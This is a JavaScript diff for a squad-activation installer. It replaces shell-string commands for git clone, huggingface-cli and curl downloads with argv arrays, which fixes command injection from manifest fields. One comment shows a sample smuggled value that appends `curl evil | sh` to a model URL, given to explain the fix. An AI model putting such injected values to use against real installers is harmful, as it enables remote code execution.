-    if (fs.existsSync(path.join(sub, 'node_modules'))) { out.push({ dir: e.name, status: 'already_present', kind: 'subapp' }); continue; }
-    const mgr = (fs.existsSync(path.join(sub, 'bun.lock')) || fs.existsSync(path.join(sub, 'bun.lockb'))) ? 'bun'
-              : fs.existsSync(path.join(sub, 'pnpm-lock.yaml')) ? 'pnpm'
-              : fs.existsSync(path.join(sub, 'yarn.lock')) ? 'yarn' : 'npm';
-    const cmd = `${mgr} install`;
-    if (dryRun) { out.push({ dir: e.name, status: 'would_install', kind: 'subapp', cmd }); continue; }
-    const r = runCmd(cmd, { cwd: sub });
-    out.push({ dir: e.name, status: r.ok ? 'installed' : 'install_failed', kind: 'subapp', manager: mgr, error: r.ok ? null : r.error });
+    const pkgPath = path.join(sub, 'package.json');
+    if (!fs.existsSync(pkgPath)) continue;
+
+    // A pre-existing REAL node_modules is somebody's installed tree; leave it
+    // and let `nrv deps adopt` fold it into the store. A symlink means this
+    // sub-app is already pointed at the store.
+    let existing = null;
+    try { existing = fs.lstatSync(path.join(sub, 'node_modules')); } catch { /* absent */ }
+    if (existing && !existing.isSymbolicLink()) { out.push({ dir: e.name, status: 'stray_tree', kind: 'subapp', hint: 'nrv deps adopt' }); continue; }
+
+    let tokens = [];
+    try {
+      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
+      const deps = { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) };
+      tokens = Object.entries(deps).map(([n, v]) => `${n}@${v}`);
+    } catch { out.push({ dir: e.name, status: 'unreadable_manifest', kind: 'subapp' }); continue; }
+    if (tokens.length === 0) { out.push({ dir: e.name, status: 'no_deps', kind: 'subapp' }); continue; }
+
+    // Same rule as the squad root: install ONCE into the shared store, then
+    // link. Previously this ran a package manager inside every sub-app dir, so
+    // one squad could produce three separate node_modules trees
+    // (instagram-intelligence-nirvana: dashboard/ + scripts/).
+    if (dryRun) {
+      const plan = DEPS.install(tokens, { dryRun: true });
+      out.push({ dir: e.name, status: 'would_install', kind: 'subapp', cmd: plan.cmd, packages: tokens });
+      continue;
+    }
+    const res = DEPS.install(tokens);
+    const linked = DEPS.link(sub);
+    out.push({
+      dir: e.name,
+      status: res.status === 'failed' ? 'install_failed' : (res.status === 'already_present' ? 'already_present' : 'installed'),
+      kind: 'subapp', manager: 'bun', store: DEPS.depsStore(), linked: linked.status,
+      error: res.error || null,
+    });
   }
   return out;
 }
 
 function installService(svc, dryRun) {
-  const installDir = expandPath(svc.install_dir);
+  const installDir = expandPath(svc.install_dir) || path.join(DEPS.nirvanaHome(), 'services', String(svc.name || 'unnamed'));
   const alreadyCloned = installDir && fs.existsSync(installDir);
 
   // 1. Health check first — service may already be running
@@ -291,10 +765,13 @@ function installService(svc, dryRun) {
     if (h.ok) return { name: svc.name, status: 'already_running', kind: 'service' };
   }
 
-  // 2. Clone if missing
+  // 2. Clone if missing. `repo` and `install_dir` are manifest DATA, like the
+  // package tokens and the model url — argv, never a shell line. (`install_cmd`
+  // below is the opposite: a shell line the squad author wrote on purpose.)
   if (svc.repo && !alreadyCloned) {
-    if (dryRun) return { name: svc.name, status: 'would_clone', kind: 'service', cmd: `git clone ${svc.repo} ${installDir}` };
-    const r = runCmd(`git clone ${svc.repo} ${installDir}`);
+    const argv = ['git', 'clone', String(svc.repo), ...(installDir ? [installDir] : [])];
+    if (dryRun) return { name: svc.name, status: 'would_clone', kind: 'service', cmd: displayCmd(argv), argv };
+    const r = runArgv(argv);
     if (!r.ok) return { name: svc.name, status: 'clone_failed', kind: 'service', error: r.error };
   }
 
@@ -326,11 +803,13 @@ function installCustomNodes(nodes, dryRun) {
       results.push({ name: node.name, status: 'already_present', kind: 'custom_node' });
       continue;
     }
+    // Same rule as services: `repo` is data out of the manifest.
+    const argv = ['git', 'clone', String(node.repo), dst];
     if (dryRun) {
-      results.push({ name: node.name, status: 'would_clone', kind: 'custom_node', cmd: `git clone ${node.repo} ${dst}` });
+      results.push({ name: node.name, status: 'would_clone', kind: 'custom_node', cmd: displayCmd(argv), argv });
       continue;
     }
-    const r = runCmd(`git clone ${node.repo} ${dst}`);
+    const r = runArgv(argv);
     results.push({ name: node.name, status: r.ok ? 'installed' : 'clone_failed', kind: 'custom_node', error: r.ok ? null : r.error });
   }
   return { status: 'done', kind: 'custom_nodes', items: results };
@@ -340,7 +819,9 @@ function installModels(models, dryRun, opts = {}) {
   if (!Array.isArray(models) || models.length === 0) return { status: 'no_models' };
   const results = [];
   for (const m of models) {
-    const dst = expandPath(m.install_to);
+    // Unspecified destination now defaults INSIDE ~/.nirvana instead of
+    // wherever the caller happened to be.
+    const dst = expandPath(m.install_to) || path.join(DEPS.nirvanaHome(), 'models', String(m.name || 'unnamed'));
     const fileTarget = m.filename ? path.join(dst, m.filename) : dst;
     if (m.filename && fs.existsSync(fileTarget)) {
       results.push({ name: m.name, status: 'already_present', kind: 'model' });
@@ -360,22 +841,27 @@ function installModels(models, dryRun, opts = {}) {
       });
       continue;
     }
-    let cmd;
+    // Same field-is-data rule as `node:` and `python:`: `repo`, `url`, `filename`
+    // and `install_to` come out of dependencies.yaml, so a shell line here would
+    // let `url: "https://x/m.bin; curl evil | sh"` run its own command. argv also
+    // fixes the quieter half of the old bug — an install path with a space used
+    // to split into two arguments.
+    let argv;
     if (m.source === 'huggingface') {
-      cmd = `huggingface-cli download ${m.repo} ${m.filename || ''} --local-dir ${dst}`.trim();
+      argv = ['huggingface-cli', 'download', String(m.repo), ...(m.filename ? [String(m.filename)] : []), '--local-dir', dst];
     } else if (m.source === 'url') {
-      cmd = `curl -L -o ${fileTarget} ${m.url}`;
+      argv = ['curl', '-L', '-o', fileTarget, String(m.url)];
     } else {
       results.push({ name: m.name, status: 'unknown_source', kind: 'model', source: m.source });
       continue;
     }
     if (dryRun) {
-      results.push({ name: m.name, status: 'would_download', kind: 'model', cmd });
+      results.push({ name: m.name, status: 'would_download', kind: 'model', cmd: displayCmd(argv), argv });
       continue;
     }
     ensureDir(dst);
-    const r = runCmd(cmd, { timeoutMs: 7200000 });
-    results.push({ name: m.name, status: r.ok ? 'downloaded' : 'download_failed', kind: 'model', error: r.ok ? null : r.error });
+    const r = runArgv(argv, { timeoutMs: 7200000 });
+    results.push({ name: m.name, status: r.ok ? 'downloaded' : 'download_failed', kind: 'model', install_to: dst, outside_nirvana: outsideNirvana(dst) || undefined, error: r.ok ? null : r.error });
   }
   return { status: 'done', kind: 'models', items: results };
 }
@@ -405,12 +891,28 @@ function checkEnvVars(vars) {
   return { status: 'done', kind: 'env_vars', items: results };
 }
 
+function reportMcps(mcps) {
+  const { normalizeMcps, mcpConfiguredIn } = require(path.join(__dirname, "..", "..", "_shared", "lib", "host-mcp.js"));
+  const list = normalizeMcps(mcps);
+  if (list.length === 0) return { status: "no_mcps" };
+  const items = list.map((m) => {
+    const configured_in = mcpConfiguredIn(m.name);
+    return {
+      name: m.name, purpose: m.purpose, required: m.required, configured_in,
+      status: configured_in.length ? "host_configured" : "host_missing",
+      note: configured_in.length ? null : "declared by the squad; configure it in the runtime that executes the squad",
+    };
+  });
+  return { status: "done", kind: "mcps", items };
+}
+
 function runPostInstall(commands, dryRun) {
   if (!Array.isArray(commands) || commands.length === 0) return { status: 'no_post_install' };
   const results = [];
   for (const cmd of commands) {
     if (dryRun) { results.push({ cmd, status: 'would_run' }); continue; }
-    const r = runCmd(cmd, { timeoutMs: 120000 });
+    // POSIX-authored by every pack that has one: through Git Bash on Windows.
+    const r = runCmd(cmd, { timeoutMs: 120000, posix: true });
     results.push({ cmd, status: r.ok ? 'ok' : 'failed', error: r.ok ? null : r.error });
   }
   return { status: 'done', kind: 'post_install', items: results };
@@ -435,7 +937,11 @@ function _synthesizeFromManifests(squadDir, slug) {
       const deps = { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) };
       const packages = Object.entries(deps).map(([name, ver]) => `${name}@${ver}`);
       if (packages.length > 0) {
-        synth.node = { manager: pkg.packageManager?.startsWith('pnpm') ? 'pnpm' : 'npm', cwd: squadDir, packages };
+        // No `cwd`: the store is the only destination. The manager field is
+        // vestigial for local installs (deps-home always uses `bun add --cwd
+        // <store>`, the one primitive that merges instead of pruning) and is
+        // kept only so `status` output still names what the squad declared.
+        synth.node = { manager: pkg.packageManager?.startsWith('pnpm') ? 'pnpm' : 'npm', packages };
         synth._sources.push('package.json');
       }
     } catch (e) { /* malformed package.json — skip */ }
@@ -453,7 +959,8 @@ function _synthesizeFromManifests(squadDir, slug) {
           .map(s => s.replace(/^[\s"']+|[\s"']+$/g, ''))
           .filter(s => s.length > 0 && !s.startsWith('#'));
         if (packages.length > 0) {
-          synth.python = { manager: 'uv', target_dir: squadDir, packages };
+          // No target_dir: pip/uv install into the shared Python home.
+          synth.python = { manager: 'uv', packages };
           synth._sources.push('pyproject.toml');
         }
       }
@@ -469,7 +976,7 @@ function _synthesizeFromManifests(squadDir, slug) {
         .map(l => l.replace(/#.*$/, '').trim())
         .filter(l => l.length > 0);
       if (packages.length > 0) {
-        synth.python = { manager: 'pip', target_dir: squadDir, packages };
+        synth.python = { manager: 'pip', packages };
         synth._sources.push('requirements.txt');
       }
     } catch (e) { /* skip */ }
@@ -562,7 +1069,7 @@ function activate(slug, opts = {}) {
 
   // Python deps
   if (deps.python) {
-    log.steps.python = installPython(deps.python, dryRun);
+    log.steps.python = installPython(deps.python, dryRun, squadDir);
   }
 
   // Node deps
@@ -595,6 +1102,12 @@ function activate(slug, opts = {}) {
     log.steps.env_vars = checkEnvVars(deps.env_vars);
   }
 
+  // MCP servers (report only — the HOST runtime configures and runs them;
+  // the squad declares what it needs so the operator knows before dispatch)
+  if (deps.mcps) {
+    log.steps.mcps = reportMcps(deps.mcps);
+  }
+
   // Post-install hooks
   if (deps.post_install) {
     log.steps.post_install = runPostInstall(deps.post_install, dryRun);
@@ -614,7 +1127,16 @@ function activate(slug, opts = {}) {
       // Missing API keys / system prereqs do NOT block activation — the squad
       // installs its code deps and runs in degraded mode until the user supplies
       // them. Surfaced as warnings so the caller can prompt the user.
-      else if (item.status === 'missing_required' || item.status === 'missing_system_tool') warnings.push({ step: stepName, ...item });
+      else if (item.status === 'missing_required' || item.status === 'missing_system_tool' || item.status === 'python_unavailable') warnings.push({ step: stepName, ...item });
+      // An MCP server the squad declares and no host configuration names: the
+      // engine cannot install it (it belongs to the runtime), so it is a warning
+      // with the file to edit, never a failure.
+      else if (item.status === 'host_missing') warnings.push({ step: stepName, ...item });
+      // A post_install hook that failed. Hooks are cosmetic (reindex, print a
+      // version) and the agent driving the activation is who reads this: a
+      // warning it can act on, never a failure that hides the squad. Until now
+      // this status matched no branch at all and the failure was invisible.
+      else if (item.status === 'failed') warnings.push({ step: stepName, ...item });
     }
   }
 
@@ -654,7 +1176,9 @@ function deactivate(slug) {
   return { ok: true, slug, deactivated_at: new Date().toISOString() };
 }
 
-module.exports = { activate, status, deactivate };
+// windowsCmdMetachar is exported for its own test: it is the whole Windows
+// decision, and the spawn it guards cannot be exercised from a POSIX runner.
+module.exports = { activate, status, deactivate, _windowsShellPlan: windowsShellPlan, _fetchAndExecute: fetchAndExecute, _posixShell: posixShell, _pythonCandidates: pythonCandidates };
 
 // CLI — exit codes follow the contract documented in scripts/activate-squad.sh:
 //   0 = ok / activated
